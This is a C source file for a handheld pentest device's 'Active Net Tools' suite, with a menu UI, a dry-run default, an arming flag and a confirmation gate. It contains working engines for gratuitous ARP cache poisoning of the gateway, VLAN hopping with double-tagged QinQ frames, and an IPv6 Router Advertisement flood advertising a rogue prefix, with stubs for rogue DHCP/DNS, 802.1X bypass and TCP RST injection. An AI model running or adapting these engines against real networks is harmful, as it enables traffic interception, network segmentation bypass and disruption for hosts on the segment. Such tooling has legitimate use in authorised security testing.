/*
 * CaDS Zero - "Active Net Tools" (M9) suite app implementation.
 *
 * Two views, one session block - see cads_active.h for why. The selector is a
 * cads_menu_t of the seven tools; activating a row records which tool is
 * selected and pushes the single shared tool view (CADS_VIEW_ID_ACTIVE_TOOL),
 * which then renders and behaves per that recorded selection.
 *
 * The shared tool view has three modes, all drawn inside the same view (the
 * confirm gate is a MODE here, not a separate cads_dialog_t - RAM):
 *
 *   CONFIG  - edit dry-run / interval / target, then "Start"
 *   CONFIRM - the explicit gate before the first real packet: Yes/No, with
 *             the "controlled network only" warning text the roadmap requires
 *   RUN     - the engine ticks from cads_active_tick(); Back stops and returns
 *             to CONFIG (the engine is always stopped on view exit too, so a
 *             promiscuous capture session can never be left running by
 *             navigating away)
 *
 * PHASING
 * -------
 * Phase 0 (this file as shipped here) implements the full UX shell and the
 * ARP cache-poisoner engine (#1) end to end, dry-run-gated. The other six
 * tools render "coming in Phase X" in RUN mode and have no engine yet -
 * their confirm gate still works (it demonstrates the UX for every tool),
 * but starting one just shows the placeholder. Each later phase replaces
 * the placeholder with the real engine and clears the tool's `phase` field.
 */

#include "cads_active.h"

#include <string.h>

#include "cads/config/config.h"
#include "cads/net/net.h"
#include "cads/netx/frame.h"
#include "cads/netx/rawio.h"
#include "cads/toolbox/fmt.h"
#include "cads/toolbox/str.h"
#include "cads_menu.h"
#include "cads_softkeys.h"
#include "cads_view.h"
#include "canvas.h"
#include "input/cads_input.h"

/* --- tool metadata -------------------------------------------------------- */

typedef struct {
    const char* name;  /**< title shown at the top of the tool view       */
    const char* help;  /**< one-line description shown under the config    */
    const char* phase; /**< NULL once the engine is implemented, else the
                            "coming in Phase X" placeholder string         */
} cads_active_tool_meta_t;

/* Indexed by (selected_tool - CADS_ACTIVE_TOOL_ARP), so the order here must
 * match the selector's item order exactly. */
static const cads_active_tool_meta_t cads_active_tools[] = {
    {"ARP Poison",    "claim gw IP at our MAC",  NULL},      /* implemented (Phase 1 engine, dry-run-gated here) */
    {"Rogue DHCP/DNS", "serve rogue IP/DNS",      "Phase 2"},
    {"802.1X Bypass",  "clone supplicant MAC",    "Phase 2"},
    {"VLAN Hop",       "QinQ inner VID=.<octet>",  NULL},    /* implemented (Phase 1) */
    {"TCP RST",        "inject RST into flows",   "Phase 3"},
    {"MQTT/CoAP",      "CoAP probe; MQTT later",  NULL},    /* implemented (Phase 1, CoAP only; MQTT CONNECT = Phase 2) */
    {"IPv6 RA Flood",  "prefix fd00:dead:beef::",  NULL},    /* implemented (Phase 1) */
};
#define CADS_ACTIVE_TOOL_COUNT \
    (sizeof(cads_active_tools) / sizeof(cads_active_tools[0]))

/* --- session block (single-session-owner) -------------------------------- */

typedef enum {
    CADS_ACTIVE_MODE_CONFIG = 0,
    CADS_ACTIVE_MODE_CONFIRM,
    CADS_ACTIVE_MODE_RUN,
} cads_active_mode_t;

/* The four config rows the cursor moves through. Ok on the START row enters
 * the confirm gate; Ok on the others edits that field. */
#define CADS_ACTIVE_CONFIG_DRYRUN   0u
#define CADS_ACTIVE_CONFIG_INTERVAL 1u
#define CADS_ACTIVE_CONFIG_TARGET   2u
#define CADS_ACTIVE_CONFIG_START    3u
#define CADS_ACTIVE_CONFIG_FIELDS   4u

typedef struct {
    uint32_t selected_tool;  /**< CADS_ACTIVE_TOOL_* (0x0B02..0x0B08)      */
    cads_active_mode_t mode;
    uint8_t config_cursor;
    bool confirm_yes;
    bool armed; /* config's active.armed, read fresh on every CONFIRM entry -
                 * see that field's own doc comment in cads/config/config.h.
                 * The outer gate; dry_run below is the separate, existing
                 * inner one - both must allow a real send. */

    /* Config (shared across tools - only one runs at a time). */
    bool dry_run;            /**< ON by default: the safety position        */
    uint16_t interval_ms;    /**< engine tick period, 100..5000             */
    uint8_t target_octet;    /**< last-octet of the host under test, 1..254  */

    /* Run state. */
    uint32_t next_tick_ms;
    uint32_t frames_sent;
    uint32_t frames_seen;    /**< RX tools: replies/observed frames          */
    bool capture_active;     /**< true only while a capture engine really owns RX */
    char status[24];         /**< short run-mode line, e.g. "tx 12"          */
} cads_active_session_t;

static cads_active_session_t s_session = {
    .selected_tool = CADS_ACTIVE_TOOL_ARP,
    .mode = CADS_ACTIVE_MODE_CONFIG,
    .config_cursor = 0,
    .confirm_yes = false,
    .dry_run = true,
    .interval_ms = 500u,
    .target_octet = 1u,
    .next_tick_ms = 0u,
    .frames_sent = 0u,
    .frames_seen = 0u,
    .status = "idle",
};

/* --- views --------------------------------------------------------------- */

typedef struct {
    cads_view_t view;
    cads_view_dispatcher_t* dispatcher;
    cads_menu_t menu;
} cads_active_selector_t;

static cads_active_selector_t s_selector;
static cads_view_t s_tool_view;

static const cads_softkey_t cads_active_selector_keys[] = {
    {CadsKeyUp, "Up"},
    {CadsKeyDown, "Down"},
    {CadsKeyOk, "Open"},
    {CadsKeyBack, "Back"},
};

static const cads_softkey_t cads_active_tool_keys[] = {
    {CadsKeyUp, "Up"},
    {CadsKeyDown, "Down"},
    {CadsKeyOk, "Ok"},
    {CadsKeyBack, "Back"},
};

/* --- small helpers ------------------------------------------------------- */

static bool cads_active_is_capture_tool(uint32_t tool) {
    return tool == CADS_ACTIVE_TOOL_8021X || tool == CADS_ACTIVE_TOOL_RSTD;
}

static const cads_active_tool_meta_t* cads_active_meta(void) {
    size_t idx = (size_t)(s_session.selected_tool - CADS_ACTIVE_TOOL_ARP);
    if(idx >= CADS_ACTIVE_TOOL_COUNT) idx = 0u;
    return &cads_active_tools[idx];
}

static uint16_t cads_active_clamp_interval(uint16_t v) {
    if(v > 5000u) return 100u; /* wrap: 5000 -> +100 -> 5100 -> 100 */
    if(v < 100u) return 100u;
    return v;
}

static uint8_t cads_active_clamp_octet(uint8_t v) {
    if(v > 254u || v == 0u) return 1u;
    return v;
}

/* Compose a host IP on the bench segment from a last-octet (the same scheme
 * apps/nettools uses: the network part of cads_net_get_config's static IP
 * ORed with the octet). For a /24 bench this is 192.168.33.<octet>. */
static uint32_t cads_active_host_ip(uint8_t octet) {
    cads_net_config_t cfg;
    cads_net_get_config(&cfg);
    return (cfg.ip & cfg.netmask) | (uint32_t)octet;
}

/* Draw one left-aligned line at `row` (0 at the top of the content area).
 * Rows are 18 px apart, which fits the 16-px font with a comfortable gap and
 * keeps a screenful of lines within the content rect the compositor grants. */
static void cads_active_draw_text(cads_rect_t area, uint8_t row, const char* text, cads_color_t color) {
    cads_rect_t box = {
        area.x + 4,
        area.y + 2 + (int16_t)row * 18,
        area.width - 8,
        16};
    cads_canvas_draw_text_aligned(box, CadsAlignLeft, &cads_font16, text, color);
}

/* --- selector ------------------------------------------------------------ */

static const cads_menu_item_t cads_active_items[] = {
    {"ARP Poison",     "M9", CADS_ACTIVE_TOOL_ARP},
    {"Rogue DHCP/DNS",  "M9", CADS_ACTIVE_TOOL_DHCP},
    {"802.1X Bypass",   "M9", CADS_ACTIVE_TOOL_8021X},
    {"VLAN Hop",       "M9", CADS_ACTIVE_TOOL_VLANHOP},
    {"TCP RST",        "M9", CADS_ACTIVE_TOOL_RSTD},
    {"MQTT/CoAP",      "M9", CADS_ACTIVE_TOOL_BEACON},
    {"IPv6 RA Flood",  "M9", CADS_ACTIVE_TOOL_RA},
};

static void cads_active_select(const cads_menu_item_t* item, size_t index, void* context) {
    (void)index;
    cads_active_selector_t* sel = (cads_active_selector_t*)context;
    s_session.selected_tool = item->id;
    s_session.mode = CADS_ACTIVE_MODE_CONFIG;
    s_session.config_cursor = 0u;
    (void)cads_view_dispatcher_push(sel->dispatcher, CADS_VIEW_ID_ACTIVE_TOOL);
}

static void cads_active_selector_draw(cads_rect_t area, void* context) {
    (void)area;
    cads_active_selector_t* sel = (cads_active_selector_t*)context;
    if(cads_menu_is_dirty(&sel->menu)) cads_menu_draw(&sel->menu);
}

static bool cads_active_selector_input(const cads_input_event_t* event, void* context) {
    cads_active_selector_t* sel = (cads_active_selector_t*)context;
    bool consumed = cads_menu_input(&sel->menu, event);
    if(cads_menu_is_dirty(&sel->menu)) {
        cads_view_dirty_rect(&sel->view, cads_menu_damage(&sel->menu));
    }
    return consumed;
}

static void cads_active_selector_enter(void* context) {
    cads_active_selector_t* sel = (cads_active_selector_t*)context;
    cads_menu_set_area(&sel->menu, cads_view_area(&sel->view));
}

/* --- shared tool view: draw --------------------------------------------- */

static void cads_active_draw_config(cads_rect_t area, const cads_active_tool_meta_t* meta) {
    char line[32];
    char num[12];
    const char* mark;

    cads_active_draw_text(area, 2, "Controlled net only", CadsColorGray);

    mark = (s_session.config_cursor == CADS_ACTIVE_CONFIG_DRYRUN) ? ">" : " ";
    cads_str_copy(line, sizeof(line), mark);
    cads_str_append(line, sizeof(line), "Dry-run: ");
    cads_str_append(line, sizeof(line), s_session.dry_run ? "ON" : "OFF");
    cads_active_draw_text(area, 3, line, CadsColorWhite);

    mark = (s_session.config_cursor == CADS_ACTIVE_CONFIG_INTERVAL) ? ">" : " ";
    cads_str_copy(line, sizeof(line), mark);
    cads_str_append(line, sizeof(line), "Interval: ");
    cads_fmt_uint(num, sizeof(num), s_session.interval_ms);
    cads_str_append(line, sizeof(line), num);
    cads_str_append(line, sizeof(line), "ms");
    cads_active_draw_text(area, 4, line, CadsColorWhite);

    mark = (s_session.config_cursor == CADS_ACTIVE_CONFIG_TARGET) ? ">" : " ";
    cads_str_copy(line, sizeof(line), mark);
    cads_str_append(line, sizeof(line), "Target: .");
    cads_fmt_uint(num, sizeof(num), s_session.target_octet);
    cads_str_append(line, sizeof(line), num);
    cads_active_draw_text(area, 5, line, CadsColorWhite);

    mark = (s_session.config_cursor == CADS_ACTIVE_CONFIG_START) ? ">" : " ";
    cads_str_copy(line, sizeof(line), mark);
    cads_str_append(line, sizeof(line), "Start");
    cads_active_draw_text(area, 6, line, CadsColorAccent);

    cads_active_draw_text(area, 8, meta->help, CadsColorGray);
}

static void cads_active_draw_confirm(cads_rect_t area, const cads_active_tool_meta_t* meta) {
    (void)meta;
    if(!s_session.armed) {
        cads_active_draw_text(area, 2, "BLOCKED: device not armed.", CadsColorRed);
        cads_active_draw_text(area, 4, "Set active.armed = 1 in", CadsColorAmber);
        cads_active_draw_text(area, 5, "config.txt to enable any", CadsColorAmber);
        cads_active_draw_text(area, 6, "active tool on this device.", CadsColorAmber);
        cads_active_draw_text(area, 8, "Back to cancel", CadsColorGray);
        return;
    }
    cads_active_draw_text(area, 2, "Sends forged traffic.", CadsColorAmber);
    cads_active_draw_text(area, 3, "Use only on a network", CadsColorAmber);
    cads_active_draw_text(area, 4, "you control.", CadsColorAmber);
    cads_active_draw_text(area, 6, s_session.confirm_yes ? "> Yes   No" : "  Yes  >No", CadsColorWhite);
    cads_active_draw_text(area, 8, "Ok=go  Back=cancel", CadsColorGray);
}

static void cads_active_draw_run(cads_rect_t area, const cads_active_tool_meta_t* meta) {
    if(meta->phase != NULL) {
        char line[32];
        cads_str_copy(line, sizeof(line), "coming: ");
        cads_str_append(line, sizeof(line), meta->phase);
        cads_active_draw_text(area, 3, line, CadsColorGray);
        cads_active_draw_text(area, 8, "Back to stop", CadsColorGray);
        return;
    }
    cads_active_draw_text(area, 3, s_session.status, CadsColorAccent);
    cads_active_draw_text(area, 5, s_session.dry_run ? "DRY-RUN" : "LIVE", s_session.dry_run ? CadsColorGray : CadsColorRed);
    cads_active_draw_text(area, 8, "Back to stop", CadsColorGray);
}

static void cads_active_tool_draw(cads_rect_t area, void* context) {
    (void)context;
    cads_canvas_fill_rect(area.x, area.y, area.width, area.height, CadsColorBackground);

    const cads_active_tool_meta_t* meta = cads_active_meta();
    cads_active_draw_text(area, 0, meta->name, CadsColorAccent);

    switch(s_session.mode) {
        case CADS_ACTIVE_MODE_CONFIG: cads_active_draw_config(area, meta); break;
        case CADS_ACTIVE_MODE_CONFIRM: cads_active_draw_confirm(area, meta); break;
        case CADS_ACTIVE_MODE_RUN: cads_active_draw_run(area, meta); break;
    }
}

/* --- shared tool view: engine start/stop -------------------------------- */

static void cads_active_engine_start(void) {
    s_session.frames_sent = 0u;
    s_session.frames_seen = 0u;
    s_session.next_tick_ms = 0u; /* fire on the first tick */

    const cads_active_tool_meta_t* meta = cads_active_meta();
    if(meta->phase != NULL) {
        /* Not implemented yet - do NOT take a capture session or suppress
         * poll for a tool with no engine. Just show the placeholder. */
        cads_str_copy(s_session.status, sizeof(s_session.status), "coming");
        return;
    }

    cads_str_copy(s_session.status, sizeof(s_session.status), "starting");
    if(cads_active_is_capture_tool(s_session.selected_tool)) {
        if(cads_netx_capture_begin()) {
            cads_net_set_poll_suppressed(true);
            s_session.capture_active = true;
        }
    }
}

static void cads_active_engine_stop(void) {
    if(s_session.capture_active) {
        cads_netx_capture_end(); /* restores promiscuous off + poll resumed */
        cads_net_set_poll_suppressed(false);
        s_session.capture_active = false;
    }
    s_session.mode = CADS_ACTIVE_MODE_CONFIG;
    cads_str_copy(s_session.status, sizeof(s_session.status), "idle");
}

/* --- shared tool view: input -------------------------------------------- */

static bool cads_active_config_input(const cads_input_event_t* event) {
    switch(event->key) {
        case CadsKeyUp:
            if(s_session.config_cursor > 0u) s_session.config_cursor--;
            else s_session.config_cursor = CADS_ACTIVE_CONFIG_FIELDS - 1u;
            break;
        case CadsKeyDown:
            s_session.config_cursor = (uint8_t)((s_session.config_cursor + 1u) % CADS_ACTIVE_CONFIG_FIELDS);
            break;
        case CadsKeyOk:
            switch(s_session.config_cursor) {
                case CADS_ACTIVE_CONFIG_DRYRUN: s_session.dry_run = !s_session.dry_run; break;
                case CADS_ACTIVE_CONFIG_INTERVAL:
                    s_session.interval_ms = cads_active_clamp_interval((uint16_t)(s_session.interval_ms + 100u));
                    break;
                case CADS_ACTIVE_CONFIG_TARGET:
                    s_session.target_octet = cads_active_clamp_octet((uint8_t)(s_session.target_octet + 1u));
                    break;
                case CADS_ACTIVE_CONFIG_START: {
                    s_session.confirm_yes = false;
                    s_session.mode = CADS_ACTIVE_MODE_CONFIRM;
                    cads_config_t cfg;
                    (void)cads_config_load(&cfg); /* always leaves cfg valid, error or not */
                    s_session.armed = cfg.active_armed;
                    break;
                }
                default: break;
            }
            break;
        case CadsKeyBack:
            return false; /* unconsumed: dispatcher pops back to the selector */
        default: break;
    }
    cads_view_dirty(&s_tool_view);
    return true;
}

static bool cads_active_confirm_input(const cads_input_event_t* event) {
    if(!s_session.armed) {
        /* Blocked view (cads_active_draw_confirm) - Back is the only live
         * key. This is the actual enforcement point, not the drawing: Up/
         * Down/Ok are inert here regardless of what's on screen. */
        if(event->key == CadsKeyBack) s_session.mode = CADS_ACTIVE_MODE_CONFIG;
        cads_view_dirty(&s_tool_view);
        return true;
    }
    switch(event->key) {
        case CadsKeyUp: s_session.confirm_yes = true; break;
        case CadsKeyDown: s_session.confirm_yes = false; break;
        case CadsKeyOk:
            if(s_session.confirm_yes) {
                cads_active_engine_start();
                s_session.mode = CADS_ACTIVE_MODE_RUN;
            } else {
                s_session.mode = CADS_ACTIVE_MODE_CONFIG;
            }
            break;
        case CadsKeyBack:
            s_session.mode = CADS_ACTIVE_MODE_CONFIG;
            break;
        default: break;
    }
    cads_view_dirty(&s_tool_view);
    return true;
}

static bool cads_active_run_input(const cads_input_event_t* event) {
    if(event->key == CadsKeyBack) {
        cads_active_engine_stop(); /* back to CONFIG, engine stopped */
        cads_view_dirty(&s_tool_view);
        return true; /* consumed: stay in the tool view */
    }
    return false;
}

static bool cads_active_tool_input(const cads_input_event_t* event, void* context) {
    (void)context;
    if(event->type != CadsInputPress && event->type != CadsInputRepeat) return false;
    switch(s_session.mode) {
        case CADS_ACTIVE_MODE_CONFIG: return cads_active_config_input(event);
        case CADS_ACTIVE_MODE_CONFIRM: return cads_active_confirm_input(event);
        case CADS_ACTIVE_MODE_RUN: return cads_active_run_input(event);
    }
    return false;
}

static void cads_active_tool_enter(void* context) {
    (void)context;
    /* (Re)entering the tool view always returns to a clean CONFIG state - a
     * capture session left running from a previous visit is stopped here. */
    cads_active_engine_stop();
    s_session.mode = CADS_ACTIVE_MODE_CONFIG;
    s_session.config_cursor = 0u;
    cads_view_dirty(&s_tool_view);
}

static void cads_active_tool_exit(void* context) {
    (void)context;
    /* The symmetric cleanup guaranteed by the capture-session contract: any
     * running engine is stopped, so promiscuous is off and poll is resumed
     * whenever the tool view leaves the screen, however it leaves. */
    cads_active_engine_stop();
}

/* --- engines (per tool, called from cads_active_tick) ------------------- */

/* #1 Gratuitous ARP cache poisoner. Sends a broadcast ARP reply claiming the
 * bench gateway's IP is at this board's MAC, every interval_ms - every host
 * that hears it refreshes its ARP cache to map gateway->us. Dry-run builds
 * the frame and counts it without TX; live calls cads_netx_tx_raw (a no-op
 * on the host, real on the board). Stack-local 64 B buffer is plenty for a
 * 42-byte gratuitous ARP and avoids a per-tool static staging buffer. */
static void cads_active_arp_tick(uint32_t now) {
    if((int32_t)(now - s_session.next_tick_ms) < 0) return;
    s_session.next_tick_ms = now + s_session.interval_ms;

    cads_net_config_t cfg;
    cads_net_get_config(&cfg);
    cads_net_status_t st;
    cads_net_status(&st);

    uint8_t frame[64];
    uint16_t n = cads_netx_build_arp_gratuitous(frame, sizeof(frame), st.mac, cfg.gateway);
    if(n == 0u) {
        cads_str_copy(s_session.status, sizeof(s_session.status), "build err");
        cads_view_dirty(&s_tool_view);
        return;
    }

    s_session.frames_sent++;
    if(!s_session.dry_run) (void)cads_netx_tx_raw(frame, n);

    char num[12];
    cads_str_copy(s_session.status, sizeof(s_session.status), s_session.dry_run ? "dry " : "tx ");
    cads_fmt_uint(num, sizeof(num), s_session.frames_sent);
    cads_str_append(s_session.status, sizeof(s_session.status), num);
    cads_view_dirty(&s_tool_view);
}

/* #4 VLAN Hopping Injector. Each interval sends two frames carrying an ARP
 * request for the target host as the probe payload: a single 802.1Q-tagged
 * frame (the access-port case, VID = inner) and a double-tagged QinQ frame
 * (outer VID 1 = the access port's native VID, which the switch strips on
 * ingress; inner VID = the configured target .<octet>). The QinQ shape is
 * the actual hop - the switch forwards the inner-tagged frame into the
 * target VLAN because it never saw the inner tag as an outer tag. TX-only;
 * dry-run builds and counts without TX. The ARP message is taken from
 * bytes 14..41 of the 42-byte ARP request (the 28-byte ARP message, no
 * Ethernet header) and carried under ethertype 0x0806. */
static void cads_active_vlanhop_tick(uint32_t now) {
    if((int32_t)(now - s_session.next_tick_ms) < 0) return;
    s_session.next_tick_ms = now + s_session.interval_ms;

    cads_net_config_t cfg;
    cads_net_get_config(&cfg);
    cads_net_status_t st;
    cads_net_status(&st);
    uint32_t target_ip = cads_active_host_ip(s_session.target_octet);
    uint16_t inner_vid = (uint16_t)s_session.target_octet; /* 1..254: demo VLAN range */
    static const uint8_t bcast[6] = {0xFFu, 0xFFu, 0xFFu, 0xFFu, 0xFFu, 0xFFu};

    /* ARP request for the target IP - the probe payload (42-byte frame; the
     * 28-byte ARP message at offset 14 is what the VLAN tag carries). */
    uint8_t arp[42];
    uint16_t an = cads_netx_build_arp_request(arp, sizeof(arp),
        bcast, st.mac, st.mac, cfg.ip, target_ip);
    if(an == 0u) {
        cads_str_copy(s_session.status, sizeof(s_session.status), "build err");
        cads_view_dirty(&s_tool_view);
        return;
    }

    uint8_t frame[64];
    uint16_t n;
    /* Single-tag: the plain access-port case (VID = inner). */
    n = cads_netx_build_vlan(frame, sizeof(frame), bcast, st.mac, inner_vid,
        CADS_NETX_ETHERTYPE_ARP, arp + 14u, 28u);
    if(n != 0u) {
        if(!s_session.dry_run) (void)cads_netx_tx_raw(frame, n);
        s_session.frames_sent++;
    }
    /* Double-tag (QinQ): outer 1 (native), inner = target VID - the hop. */
    n = cads_netx_build_vlan_qinq(frame, sizeof(frame), bcast, st.mac,
        1u, inner_vid, CADS_NETX_ETHERTYPE_ARP, arp + 14u, 28u);
    if(n != 0u) {
        if(!s_session.dry_run) (void)cads_netx_tx_raw(frame, n);
        s_session.frames_sent++;
    }

    char num[12];
    cads_str_copy(s_session.status, sizeof(s_session.status), s_session.dry_run ? "dry " : "tx ");
    cads_fmt_uint(num, sizeof(num), s_session.frames_sent);
    cads_str_append(s_session.status, sizeof(s_session.status), num);
    cads_view_dirty(&s_tool_view);
}

/* #7 IPv6 Router Advertisement Flooder. Sends an ICMPv6 Router Advertisement
 * (type 134) with a Prefix Information option for a fixed fd00:dead:beef::/64
 * every interval_ms. Source link-local is fe80::EUI-64(our MAC), destination
 * is the all-nodes multicast ff02::1 / MAC 33:33::1, hop-limit 255 - all the
 * values a receiver requires (RFC 4861). No lwIP IPv6 is touched; the whole
 * IPv6 header is hand-built on raw L2 by cads_netx_build_icmpv6_ra. The
 * target octet is unused (the prefix is fixed for this demo). TX-only; dry-
 * run builds and counts without TX. */
static void cads_active_ra_tick(uint32_t now) {
    if((int32_t)(now - s_session.next_tick_ms) < 0) return;
    s_session.next_tick_ms = now + s_session.interval_ms;

    cads_net_status_t st;
    cads_net_status(&st);
    static const uint8_t prefix[16] = {
        0xFDu, 0x00u, 0xDEu, 0xADu, 0xBEu, 0xEFu, 0x00u, 0x00u,
        0x00u, 0x00u, 0x00u, 0x00u, 0x00u, 0x00u, 0x00u, 0x00u};

    uint8_t frame[128];
    uint16_t n = cads_netx_build_icmpv6_ra(frame, sizeof(frame),
        st.mac, prefix, 1800u, 1800u, 1500u);
    if(n == 0u) {
        cads_str_copy(s_session.status, sizeof(s_session.status), "build err");
        cads_view_dirty(&s_tool_view);
        return;
    }

    s_session.frames_sent++;
    if(!s_session.dry_run) (void)cads_netx_tx_raw(frame, n);

    char num[12];
    cads_str_copy(s_session.status, sizeof(s_session.status), s_session.dry_run ? "dry " : "tx ");
    cads_fmt_uint(num, sizeof(num), s_session.frames_sent);
    cads_str_append(s_session.status, sizeof(s_session.status), num);
    cads_view_dirty(&s_tool_view);
}

/* #6 MQTT/CoAP Reverse Beacon (Phase 1: CoAP probe). Sends a CoAP GET
 * /.well-known/core to the target host's UDP port 5683 every interval_ms -
 * a "reverse beacon" that announces the board's presence to any CoAP
 * server on the segment and discovers resources via the standard path. The
 * CoAP message is hand-built (no lib) and carried over UDP by
 * cads_netx_build_udp; the Ethernet destination is broadcast so every host
 * on the segment receives it (a host that owns the target IP processes the
 * unicast IP inside). MQTT CONNECT over a raw TCP PCB is deferred to Phase
 * 2 with the other lwIP-RX tools. TX-only; dry-run builds and counts. */
static void cads_active_beacon_tick(uint32_t now) {
    if((int32_t)(now - s_session.next_tick_ms) < 0) return;
    s_session.next_tick_ms = now + s_session.interval_ms;

    cads_net_config_t cfg;
    cads_net_get_config(&cfg);
    cads_net_status_t st;
    cads_net_status(&st);
    uint32_t target_ip = cads_active_host_ip(s_session.target_octet);
    static const uint8_t bcast[6] = {0xFFu, 0xFFu, 0xFFu, 0xFFu, 0xFFu, 0xFFu};

    uint8_t coap[32];
    uint16_t cn = cads_netx_build_coap_get(coap, sizeof(coap), 0x0001u, ".well-known/core");
    if(cn == 0u) {
        cads_str_copy(s_session.status, sizeof(s_session.status), "build err");
        cads_view_dirty(&s_tool_view);
        return;
    }

    uint8_t frame[128];
    uint16_t n = cads_netx_build_udp(frame, sizeof(frame),
        bcast, st.mac, cfg.ip, target_ip, 56830u, 5683u, coap, cn);
    if(n == 0u) {
        cads_str_copy(s_session.status, sizeof(s_session.status), "build err");
        cads_view_dirty(&s_tool_view);
        return;
    }

    s_session.frames_sent++;
    if(!s_session.dry_run) (void)cads_netx_tx_raw(frame, n);

    char num[12];
    cads_str_copy(s_session.status, sizeof(s_session.status), s_session.dry_run ? "dry " : "tx ");
    cads_fmt_uint(num, sizeof(num), s_session.frames_sent);
    cads_str_append(s_session.status, sizeof(s_session.status), num);
    cads_view_dirty(&s_tool_view);
}

/* --- public API --------------------------------------------------------- */

void cads_active_tick(uint32_t now_ms) {
    if(s_session.mode != CADS_ACTIVE_MODE_RUN) return;
    switch(s_session.selected_tool) {
        case CADS_ACTIVE_TOOL_ARP: cads_active_arp_tick(now_ms); break;
        case CADS_ACTIVE_TOOL_VLANHOP: cads_active_vlanhop_tick(now_ms); break;
        case CADS_ACTIVE_TOOL_BEACON: cads_active_beacon_tick(now_ms); break;
        case CADS_ACTIVE_TOOL_RA: cads_active_ra_tick(now_ms); break;
        default: break; /* not implemented yet - placeholder run view */
    }
}

bool cads_active_owns_rx(void) {
    /* Only when a capture engine has actually begun and owns the RX ring -
     * NOT merely because a capture tool is selected in RUN mode. If
     * cads_netx_capture_begin() failed or the tool is an unimplemented
     * placeholder, poll was never suppressed, so claiming ownership here
     * would freeze lwIP RX with nothing draining the ring (issue #61). */
    return s_session.capture_active;
}

void cads_active_init(cads_view_dispatcher_t* dispatcher) {
    if(dispatcher == NULL) return;

    s_selector.dispatcher = dispatcher;
    cads_menu_init(
        &s_selector.menu, cads_active_items,
        sizeof(cads_active_items) / sizeof(cads_active_items[0]), &cads_font16);
    cads_menu_set_activate(&s_selector.menu, cads_active_select, &s_selector);

    cads_view_init(&s_selector.view, cads_active_selector_draw, cads_active_selector_input, &s_selector);
    cads_view_set_lifecycle(&s_selector.view, cads_active_selector_enter, NULL);
    cads_view_set_title(&s_selector.view, "Active Net Tools");
    cads_view_set_softkeys(
        &s_selector.view, cads_active_selector_keys,
        sizeof(cads_active_selector_keys) / sizeof(cads_active_selector_keys[0]));
    (void)cads_view_dispatcher_add(dispatcher, CADS_VIEW_ID_ACTIVE, &s_selector.view);

    cads_view_init(&s_tool_view, cads_active_tool_draw, cads_active_tool_input, &s_tool_view);
    cads_view_set_lifecycle(&s_tool_view, cads_active_tool_enter, cads_active_tool_exit);
    cads_view_set_title(&s_tool_view, "Active Tool");
    cads_view_set_softkeys(
        &s_tool_view, cads_active_tool_keys,
        sizeof(cads_active_tool_keys) / sizeof(cads_active_tool_keys[0]));
    (void)cads_view_dispatcher_add(dispatcher, CADS_VIEW_ID_ACTIVE_TOOL, &s_tool_view);
}